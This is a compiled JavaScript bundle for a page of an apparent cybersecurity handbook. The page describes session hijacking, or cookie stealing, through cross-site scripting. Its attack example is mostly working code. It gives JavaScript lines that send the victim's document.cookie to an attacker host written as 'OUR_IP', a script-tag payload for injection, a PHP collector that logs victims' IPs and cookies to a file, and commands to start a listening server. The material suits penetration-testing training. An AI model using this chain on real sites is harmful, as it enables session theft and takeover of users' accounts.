"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5153],{4832:(e,i,n)=>{n.r(i),n.d(i,{assets:()=>r,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>a,toc:()=>l});var t=n(5893),s=n(1151);const o={},c="Session hijacking",a={id:"offensive-security/xss/attacks/session_hijacking/README",title:"Session hijacking",description:"Session hijacking is also called Cookie Stealing.",source:"@site/docs/offensive-security/xss/attacks/session_hijacking/README.md",sourceDirName:"offensive-security/xss/attacks/session_hijacking",slug:"/offensive-security/xss/attacks/session_hijacking/",permalink:"/cybersecurity-handbook/offensive-security/xss/attacks/session_hijacking/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Phishing",permalink:"/cybersecurity-handbook/offensive-security/xss/attacks/phishing/"},next:{title:"Blind XSS",permalink:"/cybersecurity-handbook/offensive-security/xss/blind/"}},r={},l=[{value:"Overview",id:"overview",level:2},{value:"Attack example",id:"attack-example",level:2}];function h(e){const i={admonition:"admonition",code:"code",em:"em",h1:"h1",h2:"h2",p:"p",pre:"pre",strong:"strong",...(0,s.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(i.h1,{id:"session-hijacking",children:"Session hijacking"}),"\n",(0,t.jsx)(i.admonition,{type:"note",children:(0,t.jsxs)(i.p,{children:["Session hijacking is also called ",(0,t.jsx)(i.strong,{children:"Cookie Stealing"}),"."]})}),"\n",(0,t.jsx)(i.h2,{id:"overview",children:"Overview"}),"\n",(0,t.jsx)(i.p,{children:"Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials."}),"\n",(0,t.jsxs)(i.p,{children:["Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS eploitation and perform a ",(0,t.jsx)(i.em,{children:"session hijacking"})," attack."]}),"\n",(0,t.jsx)(i.h2,{id:"attack-example",children:"Attack example"}),"\n",(0,t.jsxs)(i.p,{children:["Create a ",(0,t.jsx)(i.code,{children:"script.js"})," with either of the following examples:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-javascript",children:"document.location='http://OUR_IP/index.php?c='+document.cookie;\nnew Image().src='http://OUR_IP/index.php?c='+document.cookie;\n"})}),"\n",(0,t.jsx)(i.p,{children:"Then use XSS to inject the remote script into the vulnerable input field:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-html",children:"<script src=http://OUR_IP/script.js><\/script>\n"})}),"\n",(0,t.jsx)(i.p,{children:"We can write a PHP script to split cookies with a new line and write them to a file. In this case, even if multiple victims trigget the XSS exploit, we'll get all of their cookies ordered in a file:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-php",children:'<?php\nif (isset($_GET[\'c\'])) {\n    $list = explode(";", $_GET[\'c\']);\n    foreach ($list as $key => $value) {\n        $cookie = urldecode($value);\n        $file = fopen("cookies.txt", "a+");\n        fputs($file, "Victim IP: {$_SERVER[\'REMOTE_ADDR\']} | Cookie: {$cookie}\\n");\n        fclose($file);\n    }\n}\n?>\n'})}),"\n",(0,t.jsx)(i.p,{children:"Start the PHP server:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-console",children:"$ mkdir /tmp/tmpserver\n$ cd /tmp/tmpserver\n$ sudo php -S 0.0.0.0:80\nPHP 7.4.15 Development Server (http://0.0.0.0:80) started\n"})}),"\n",(0,t.jsxs)(i.p,{children:["And then just wait for the victim to trigger the XSS exploit. When this happens, we'd see a call in our server. We can check the ",(0,t.jsx)(i.code,{children:"cookies.txt"})," file to see if we got the cookie."]})]})}function d(e={}){const{wrapper:i}={...(0,s.a)(),...e.components};return i?(0,t.jsx)(i,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},1151:(e,i,n)=>{n.d(i,{Z:()=>a,a:()=>c});var t=n(7294);const s={},o=t.createContext(s);function c(e){const i=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function a(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),t.createElement(o.Provider,{value:i},e.children)}}}]);